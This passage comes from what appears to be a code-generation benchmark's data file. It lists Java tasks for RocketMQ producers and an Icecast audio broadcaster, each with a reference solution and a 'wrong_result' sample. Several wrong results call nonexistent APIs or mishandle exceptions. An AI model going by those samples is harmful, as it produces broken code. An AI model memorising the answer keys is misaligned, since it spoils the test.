= new Message(topic, tag, key, value);\n        if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL00) {\n            msg.setDelayTimeLevel(this.messageDeliveryDelayLevel);\n        }\n        return msg;\n    }\n\n    public void close() throws Exception {\n        if (producer != null) {\n            flushSync();\n            producer.shutdown();\n        }\n    }\n\n    private void flushSync() throws Exception {\n        if (batchFlushOnCheckpoint) {\n            synchronized (batchList) {\n                if (batchList.size() > 0) {\n                    producer.send(batchList);\n                    batchList.clear();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class RocketMQSink<IN> implements SinkFunction<IN> {\n    private static final long serialVersionUID = 1L;\n    private final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n    private DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> serializationSchema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = serializationSchema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n        this.async = Boolean.parseBoolean(props.getProperty(\"async\", \"false\"));\n        this.batchFlushOnCheckpoint = Boolean.parseBoolean(props.getProperty(\"batchFlushOnCheckpoint\", \"false\"));\n        this.batchSize = Integer.parseInt(props.getProperty(\"batchSize\", \"100\"));\n        this.messageDeliveryDelayLevel = Integer.parseInt(props.getProperty(\"messageDeliveryDelayLevel\", \"0\"));\n        this.batchList = new ArrayList<>();\n    }\n\n    @Override\n    public void open(Configuration parameters) {\n        producer = new DefaultMQProducer(\"RocketMQSinkProducer\");\n        String namesrvAddr = props.getProperty(\"namesrvAddr\");\n        if (namesrvAddr != null) {\n            producer.setNamesrvAddr(namesrvAddr);\n        }\n        producer.setRetryTimesWhenSendFailed(2);\n        producer.start();\n    }\n\n    @Override\n    public void invoke(IN value) {\n        Message msg = prepareMessage(value);\n        if (batchFlushOnCheckpoint) {\n            batchList.add(msg);\n            if (batchList.size() >= batchSize) {\n                flushSync();\n            }\n        } else {\n            if (async) {\n                producer.sendAsync(msg, new SendCallback() {\n                    @Override\n                    public void onSuccess(SendResult sendResult) {\n                        LOG.info(\"Message sent successfully: {}\", sendResult);\n                    }\n\n                    @Override\n                    public void onException(Throwable e) {\n                        LOG.error(\"Message send failed: \", e);\n                    }\n                });\n            } else {\n                try {\n                    producer.send(msg);\n                } catch (Exception e) {\n                    LOG.error(\"Error sending message: \", e);\n                }\n            }\n        }\n    }\n\n    private Message prepareMessage(IN value) {\n        String topic = topicSelector.selectTopic(value);\n        String tag = topicSelector.selectTag(value);\n        byte[] body = serializationSchema.serialize(value);\n        Message msg = new Message(topic, tag, body);\n        if (messageDeliveryDelayLevel > 0) {\n            msg.setDelayLevel(messageDeliveryDelayLevel);\n        }\n        return msg;\n    }\n\n    @Override\n    public void close() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n\n    private void flushSync() {\n        if (batchList.isEmpty()) {\n            return;\n        }\n        List<Message> messages = new ArrayList<>(batchList);\n        batchList.clear();\n        try {\n            if (async) {\n                for (Message msg : messages) {\n                    producer.sendAsync(msg, new SendCallback() {\n                        @Override\n                        public void onSuccess(SendResult sendResult) {\n                            LOG.info(\"Message sent successfully: {}\", sendResult);\n                        }\n\n                        @Override\n                        public void onException(Throwable e) {\n                            LOG.error(\"Message send failed: \", e);\n                        }\n                    });\n                }\n            } else {\n                producer.sendBatch(messages);\n            }\n        } catch (Exception e) {\n            LOG.error(\"Error sending batch: \", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending ordered messages to specified topics with tags, while maintaining message order based on an order ID.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending with ordering guarantees, and resource cleanup. The class uses RocketMQ's DefaultMQProducer to send messages to a specified topic, with the ability to maintain message order through a custom MessageQueueSelector.\n\nAttributes:\n- producer: DefaultMQProducer - The core RocketMQ producer instance responsible for sending messages\n- producerGroup: String (implicit) - The producer group name passed to the constructor\n- namesrvAddr: String (implicit) - The NameServer address passed to the constructor\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes the producer with the given group name and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources\n- sendOrderedMessage: sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) -> SendResult - Sends an ordered message to the specified topic with the given tags, key, and body, using the orderId to maintain message order",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\nimport java.util.List;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) \n        throws Exception {\n        Message msg = new Message(topic, tags[orderId % tags.length], key,\n            body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        \n        SendResult sendResult = producer.send(msg, new MessageQueueSelector() {\n            @Override\n            public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                Integer id = (Integer) arg;\n                int index = id % mqs.size();\n                return mqs.get(index);\n            }\n        }, orderId);\n\n        return sendResult;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class Producer {\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        this.producer.start();\n    }\n\n    public void shutdown() {\n        this.producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) {\n        Message msg = new Message(topic, tags[0], key, body.getBytes());\n        MessageQueueSelector selector = (list, msg, arg) -> {\n            int orderIdArg = (int) arg;\n            int index = orderIdArg % list.size();\n            return list.get(index);\n        };\n        return producer.sendOrderedMessage(topic, msg, selector, orderId);\n    }\n}"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer for sending order-related messages to a specified topic.\n\nClass Description: The OrderProducer class is a Spring component that initializes and manages a RocketMQ producer instance. It provides methods to send test order messages and actual order objects to a configured RocketMQ topic.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the RocketMQ NameServer (injected from properties)\n- topicName: String - The target topic name for messages (injected from properties)\n\nMethods:\n- init(): void - Initializes the producer instance with configuration settings and starts it. Uses @PostConstruct to ensure initialization after dependency injection.\n- send(): void - Sends 100 test order messages to the configured topic with incrementing tags.\n- send(HOrder order): boolean - Sends a serialized order object to the configured topic, using the order ID in the message tag. Returns true if sent successfully, false otherwise.\n\nInput:\n- For send(): None\n- For send(HOrder order): order - An HOrder object representing the order to be sent\n\nOutput:\n- For send(): None\n- For send(HOrder order): boolean - Indicates whether the message was successfully sent (true) or not (false)",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport com.camp.promotion.entity.HOrder;\nimport org.apache.rocketmq.client.exception.MQBrokerException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.exception.RemotingException;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.nio.charset.StandardCharsets;\n\n@Component\npublic class OrderProducer {\n\n    private DefaultMQProducer producer;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() throws MQClientException {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(\"create_order_producer_group\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendFailed(3);\n        producer.setSendMsgTimeout(1000);\n        producer.start();\n    }\n\n    public void send() {\n        try {\n            for (int i = 0; i < 100; i++) {\n                String body = \"TEST_ORDER_\" + i;\n                Message message = new Message(topicName, \"create_order\" + i, body.getBytes(StandardCharsets.UTF_8));\n                SendResult sendResult = producer.send(message);\n            }\n        } catch (MQBrokerException | MQClientException | RemotingException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean send(HOrder order) {\n        byte[] body = JSON.toJSONBytes(order);\n        Message message = new Message(topicName, \"create_order\" + order.getId(), body);\n        SendResult sendResult;\n        try {\n            sendResult = producer.send(message);\n        } catch (MQClientException | RemotingException | MQBrokerException | InterruptedException e) {\n            return false;\n        }\n        return sendResult.getSendStatus() == SendStatus.SEND_OK;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "@Component\npublic class OrderProducer {\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n    \n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n    \n    private DefaultMQProducer producer;\n\n    @PostConstruct\n    public void init() {\n        producer = new DefaultMQProducer(\"OrderProducerGroup\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void send() {\n        for (int i = 0; i < 100; i++) {\n            String tag = \"TEST_TAG_\" + i;\n            Message msg = new Message(topicName, tag, \"Test order message\".getBytes());\n            try {\n                producer.send(msg);\n            } catch (MQClientException e) {\n                // Handle exception, maybe log?\n            }\n        }\n    }\n\n    public boolean send(HOrder order) {\n        try {\n            String json = JSON.toJSONString(order);\n            Message msg = new Message(topicName, order.getOrderId(), json.getBytes());\n            SendResult result = producer.send(msg);\n            return true;\n        } catch (MQClientException e) {\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with configurable group, tags, and keys.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending, and shutdown operations. The class provides methods to start the producer, send messages synchronously, and gracefully shut down the producer.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- group: String - The producer group name\n- topic: String - The topic to which messages will be sent\n- tags: String - The tags for message categorization\n- keys: String - The keys for message identification\n\nMethods:\n- Producer(String group, String topic, String tags, String keys) -> void - Constructor that initializes the producer with given group, topic, tags, and keys\n- start() -> void - Starts the producer instance\n- sendMessage(String messageContent) -> SendResult - Synchronously sends a message with the given content and returns the send result\n- shutdown() -> void - Shuts down the producer instance\n- buildCommandline(String[] args) -> CommandLine - Static method that builds and parses command line arguments for producer configuration",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.HelpFormatter;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.commons.cli.ParseException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) throws MQClientException {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n        this.producer.setInstanceName(Long.toString(System.currentTimeMillis()));\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws Exception {\n        Message msg = new Message(\n            topic,\n            tags,\n            keys,\n            messageContent.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        final Options options = new Options();\n        Option opt = new Option(\"h\", \"help\", false, \"Print help\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"g\", \"producerGroup\", true, \"Producer Group Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Topic Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"a\", \"tags\", true, \"Tags Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"k\", \"keys\", true, \"Keys Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"c\", \"msgCount\", true, \"Message Count\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        DefaultParser parser = new DefaultParser();\n        HelpFormatter hf = new HelpFormatter();\n        hf.setWidth(110);\n        CommandLine commandLine = null;\n        try {\n            commandLine = parser.parse(options, args);\n            if (commandLine.hasOption('h')) {\n                hf.printHelp(\"producer\", options, true);\n                return null;\n            }\n        } catch (ParseException e) {\n            hf.printHelp(\"producer\", options, true);\n            return null;\n        }\n\n        return commandLine;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.SendResult;\nimport org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.CommandLineParser;\nimport org.apache.commons.cli.GnuParser;\nimport org.apache.commons.cli.HelpFormatter;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.commons.cli.ParseException;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        producer = new DefaultMQProducer(group);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws MQClientException {\n        Message msg = new Message(topic, tags, messageContent.getBytes());\n        msg.setKeys(keys);\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        Options options = new Options();\n        options.addOption(Option.builder().longOpt(\"group\").hasArg().argName(\"group\").desc(\"Producer group\").build());\n        options.addOption(Option.builder().longOpt(\"topic\").hasArg().argName(\"topic\").desc(\"Topic\").build());\n        options.addOption(Option.builder().longOpt(\"tags\").hasArg().argName(\"tags\").desc(\"Tags\").build());\n        options.addOption(Option.builder().longOpt(\"keys\").hasArg().argName(\"keys\").desc(\"Keys\").build());\n\n        CommandLineParser parser = new GnuParser();\n        try {\n            return parser.parse(options, args);\n        } catch (ParseException e) {\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic, querying messages, and managing the producer lifecycle.\n\nClass Description: The TestProducer class provides functionality to initialize, start, and manage a RocketMQ producer instance. It can send messages to a specified topic with tags and keys, query messages based on criteria, and properly shut down the producer when no longer needed.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages and performing message-related operations.\n\nMethods:\n- TestProducer(String namesrvAddr, String producerGroup) -> void - Constructor that initializes the producer with the specified NameServer address and producer group.\n- start() -> void - Starts the producer instance to begin sending messages.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Sends a message to the specified topic with given tags, keys, and body. Returns the send result.\n- queryMessage(String topic, String key, int maxNum, long begin, long end) -> QueryResult - Queries messages for the specified topic based on key, maximum number of messages, and time range. Returns the query result.\n- shutdown() -> void - Shuts down the producer instance gracefully.",
    "Canonical_solution": "import org.apache.rocketmq.client.QueryResult;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class TestProducer {\n\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws Exception {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class TestProducer {\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) {\n        Message msg = new Message(topic, tags, body.getBytes());\n        msg.setKeys(keys);\n        return producer.send(msg);\n    }\n\n    public List<MessageExt> queryMessage(String topic, String key, int maxNum, long begin, long end) {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 396,
    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to a specified topic with tags and keys, and handling success/failure callbacks.\n\nClass Description: AsyncProducer is a RocketMQ asynchronous message producer class that initializes a producer instance, sends messages asynchronously to a specified topic, and provides shutdown capability. It handles message sending callbacks for success and failure scenarios.\n\nAttributes:\nproducer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages\n\nMethods:\nAsyncProducer: [Constructor](String producerGroup, String namesrvAddr) -> void - Initializes the producer with a producer group name and NameServer address, sets retry policy for async sends, and starts the producer instance\nsendAsyncMessage: [Method](String topic, String tags, String keys, String body) -> void - Creates and sends an asynchronous message to the specified topic with given tags and keys, using the provided message body\nshutdown: [Method]() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\n\npublic class AsyncProducer {\n\n    private DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendAsyncFailed(0);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) throws UnsupportedEncodingException {\n        Message msg = new Message(topic, \n                                tags, \n                                keys, \n                                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        try {\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    System.out.printf(\"OK %s %n\", sendResult.getMsgId());\n                }\n\n                @Override\n                public void onException(Throwable e) {\n                    System.out.printf(\"Exception %s %n\", e);\n                    e.printStackTrace();\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class AsyncProducer {\n    private DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendFailed(2);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) {\n        Message msg = new Message(topic, tags, body.getBytes());\n        msg.setMessageKey(keys);\n        producer.sendAsync(msg, new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                System.out.println(\"Message sent successfully: \" + sendResult);\n            }\n\n            @Override\n            public void onFailure(SendMsgTimeoutException e) {\n                System.err.println(\"Message send failed: \" + e.getMessage());\n            }\n        });\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 397,
    "Instruction": "Task Description: Create a Java class that implements an Icecast HTTP audio broadcaster using Apache MINA for TCP client communication. The class should handle connection management, session handling, and error states for streaming audio to an Icecast server.\n\nClass Description: The IcecastHTTPAudioBroadcaster class manages the connection and streaming of audio data to an Icecast server using HTTP over TCP. It handles connection states, authentication, and error recovery while maintaining a persistent session with the server.\n\nAttributes:\n- mLog: Logger - Logger instance for logging events and errors\n- RECONNECT_INTERVAL_MILLISECONDS: long - Time interval between connection attempts (30 seconds)\n- mSocketConnector: NioSocketConnector - MINA socket connector for TCP communication\n- mStreamingSession: IoSession - Current active streaming session\n- mConnecting: AtomicBoolean - Flag indicating if a connection attempt is in progress\n- mLastConnectionAttempt: long - Timestamp of last connection attempt\n\nMethods:\n- IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) -> void - Constructor that initializes the broadcaster with configuration\n- connect() -> boolean - Attempts to establish a connection to the Icecast server, returns true if successful\n- disconnect() -> void - Closes the current streaming session and cleans up resources\n- connected() -> boolean - Returns true if currently connected to the server\n- canConnect() -> boolean - Returns true if conditions allow for a connection attempt\n- getBroadcastConfiguration() -> IcecastHTTPConfiguration - Returns the current broadcast configuration\n- setBroadcastState(BroadcastState state) -> void - Updates the current broadcast state\n- getBroadcastState() -> BroadcastState - Returns the current broadcast state\n- getHTTPHeaders() -> Map<String,String> - Returns HTTP headers for the connection\n- getConfiguration() -> IcecastHTTPConfiguration - Returns the configuration object\n\nInner Class:\n- IcecastHTTPIOHandler extends IoHandlerAdapter - Handles MINA session events\n  Methods:\n  - sessionOpened(IoSession session) -> void - Sends HTTP PUT request when session opens\n  - sessionClosed(IoSession session) -> void - Handles session cleanup when closed\n  - exceptionCaught(IoSession session, Throwable throwable) -> void - Handles connection exceptions\n  - messageReceived(IoSession session, Object object) -> void - Processes server responses",
    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.BroadcastState;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastHTTPConfiguration;\nimport org.apache.mina.core.RuntimeIoException;\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.future.ConnectFuture;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolDecoderException;\nimport org.apache.mina.http.HttpClientCodec;\nimport org.apache.mina.http.HttpRequestImpl;\nimport org.apache.mina.http.api.DefaultHttpResponse;\nimport org.apache.mina.http.api.HttpMethod;\nimport org.apache.mina.http.api.HttpVersion;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IcecastHTTPAudioBroadcaster {\n\n    private static final Logger mLog = LoggerFactory.getLogger(IcecastHTTPAudioBroadcaster.class);\n    private static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n\n    private NioSocketConnector mSocketConnector;\n    private IoSession mStreamingSession = null;\n    private AtomicBoolean mConnecting = new AtomicBoolean();\n    private long mLastConnectionAttempt = 0;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        // Constructor logic\n    }\n\n    private boolean connect() {\n        if(!connected() && canConnect() &&\n            (mLastConnectionAttempt + RECONNECT_INTERVAL_MILLISECONDS < System.currentTimeMillis()) &&\n            mConnecting.compareAndSet(false, true))\n        {\n            mLastConnectionAttempt = System.currentTimeMillis();\n\n            if(mSocketConnector == null) {\n                mSocketConnector = new NioSocketConnector();\n                mSocketConnector.setConnectTimeoutCheckInterval(10000);\n                mSocketConnector.getFilterChain().addLast(\"codec\", new HttpClientCodec());\n                mSocketConnector.setHandler(new IcecastHTTPIOHandler());\n            }\n\n            mStreamingSession = null;\n\n            try {\n                ConnectFuture future = mSocketConnector.connect(\n                    new InetSocketAddress(getBroadcastConfiguration().getHost(),\n                    getBroadcastConfiguration().getPort()));\n                future.awaitUninterruptibly();\n                mStreamingSession = future.getSession();\n            } catch(RuntimeIoException rie) {\n                Throwable throwableCause = rie.getCause();\n                if(throwableCause instanceof ConnectException) {\n                    setBroadcastState(BroadcastState.NO_SERVER);\n                } else {\n                    setBroadcastState(BroadcastState.DISCONNECTED);\n                    mLog.debug(\"Failed to connect\", rie);\n                }\n                disconnect();\n            }\n            mConnecting.set(false);\n        }\n        return connected();\n    }\n\n    public void disconnect() {\n        if(mStreamingSession != null) {\n            mStreamingSession.closeNow();\n        }\n    }\n\n    public class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) throws Exception {\n            HttpRequestImpl request = new HttpRequestImpl(HttpVersion.HTTP_1_1, HttpMethod.PUT,\n                getConfiguration().getMountPoint(), \"\", getHTTPHeaders());\n            session.write(request);\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) throws Exception {\n            if(!getBroadcastState().isErrorState()) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            mSocketConnector.dispose();\n            mStreamingSession = null;\n            mSocketConnector = null;\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) throws Exception {\n            if(throwable instanceof ProtocolDecoderException) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            } else {\n                mLog.error(\"Broadcast error\", throwable);\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            disconnect();\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object object) throws Exception {\n            if(object instanceof DefaultHttpResponse) {\n                DefaultHttpResponse response = (DefaultHttpResponse) object;\n                switch(response.getStatus()) {\n                    case SUCCESS_OK:\n                        setBroadcastState(BroadcastState.CONNECTED);\n                        mConnecting.set(false);\n                        break;\n                    case CLIENT_ERROR_UNAUTHORIZED:\n                        setBroadcastState(BroadcastState.INVALID_CREDENTIALS);\n                        break;\n                    case CLIENT_ERROR_FORBIDDEN:\n                        setBroadcastState(BroadcastState.CONFIGURATION_ERROR);\n                        break;\n                    default:\n                        if(!getBroadcastState().isErrorState()) {\n                            setBroadcastState(BroadcastState.ERROR);\n                        }\n                        break;\n                }\n                disconnect();\n            }\n        }\n    }\n\n    // Helper methods (stubs for compilation)\n    private boolean connected() { return false; }\n    private boolean canConnect() { return false; }\n    private IcecastHTTPConfiguration getBroadcastConfiguration() { return null; }\n    private void setBroadcastState(BroadcastState state) {}\n    private BroadcastState getBroadcastState() { return null; }\n    private Map<String,String> getHTTPHeaders() { return null; }\n    private IcecastHTTPConfiguration getConfiguration() { return null; }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 10,
    "wrong_result": "public class IcecastHTTPAudioBroadcaster {\n    private final Logger mLog;\n    private static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n    private final NioSocketConnector mSocketConnector;\n    private IoSession mStreamingSession;\n    private final AtomicBoolean mConnecting;\n    private long mLastConnectionAttempt;\n\n    private final IcecastHTTPConfiguration mConfiguration;\n    private BroadcastState mBroadcastState;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        this.mLog = LoggerFactory.getLogger(IcecastHTTPAudioBroadcaster.class);\n        this.mConfiguration = configuration;\n        this.mConnecting = new AtomicBoolean(false);\n        this.mSocketConnector = new NioSocketConnector();\n        this.mSocketConnector.setHandler(new IcecastHTTPIOHandler());\n        this.mBroadcastState = BroadcastState.DISCONNECTED;\n    }\n\n    public boolean connect() {\n        if (mConnecting.get() || mStreamingSession != null && mStreamingSession.isConnected()) {\n            return true;\n        }\n        if (!canConnect()) {\n            return false;\n        }\n        mLastConnectionAttempt = System.currentTimeMillis();\n        mConnecting.set(true);\n        try {\n            mSocketConnector.connect(new InetSocketAddress(mConfiguration.getHost(), mConfiguration.getPort()));\n            return true;\n        } catch (Exception e) {\n            mLog.error(\"Failed to connect to Icecast server\", e);\n            mConnecting.set(false);\n            return false;\n        }\n    }\n\n    public void disconnect() {\n        if (mStreamingSession != null && mStreamingSession.isConnected()) {\n            mStreamingSession.close();\n            mStreamingSession = null;\n        }\n        mConnecting.set(false);\n        mBroadcastState = BroadcastState.DISCONNECTED;\n    }\n\n    public 